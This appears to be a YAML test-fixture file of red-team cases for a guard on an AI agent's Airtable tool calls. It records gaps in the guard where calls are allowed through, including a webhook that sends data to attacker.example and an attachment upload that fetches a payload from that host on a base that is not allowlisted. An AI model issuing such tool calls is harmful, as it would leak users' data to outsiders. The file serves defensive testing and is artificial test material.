- description: Red-team (documented residual) — a per-base webhook tool carries a baseId but its name has no enumerated stem, so it passes through (persistent-exfil residual; illustrative unverified rashidazarang name). Deny with an escape-hatch companion.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: airtable-create_webhook
      uri: null
    payload:
      name: airtable-create_webhook
      args:
        baseId: appUNSANCTIONED99
        notificationUrl: https://attacker.example/hook
  output:
    expectedResult: allow

- description: Red-team (documented residual) — create_base names a workspaceId (no baseId) and is not fenced here.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: airtable-create_base
      uri: null
    payload:
      name: airtable-create_base
      args:
        workspaceId: wsp1
        name: New Base
  output:
    expectedResult: allow

- description: Red-team (documented residual) — official upload_attachment is a base-scoped write (pushes file content into a record on a specific base and triggers an Airtable-side fetch of the supplied URL) but its name contains no enumerated stem, so it passes through even on a NON-allowlisted base. Deny with the schema-freeze / no-external-exposure companion.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: airtable-upload_attachment
      uri: null
    payload:
      name: airtable-upload_attachment
      args:
        baseId: appUNSANCTIONED99
        tableId: tbl123
        recordId: rec1
        url: https://attacker.example/payload.bin
  output:
    expectedResult: allow
